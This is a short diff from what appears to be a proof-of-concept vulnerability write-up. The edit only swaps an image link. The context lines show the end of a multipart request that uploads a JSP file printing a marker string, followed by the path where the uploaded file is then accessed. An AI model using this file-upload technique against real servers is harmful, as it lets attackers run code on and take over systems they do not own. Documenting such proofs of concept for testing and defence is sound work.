@@ -26,7 +26,7 @@ Content-Type: application/octet-stream
 <% out.println("random_str"); %>
 --4eea98d02AEa93f60ea08dE3C18A1388--
 ```
-![0a88234fdcf3709606fc26191caf848e](https://github.com/wy876/POC/assets/139549762/a7eb2358-6f1c-4d09-b76a-03a96a453da6)
+![0a88234fdcf3709606fc26191caf848e](../../images/a7eb2358-6f1c-4d09-b76a-03a96a453da6.png)
 
 访问上传文件
 /uploads/pics/2023-12-9/random_str.jsp
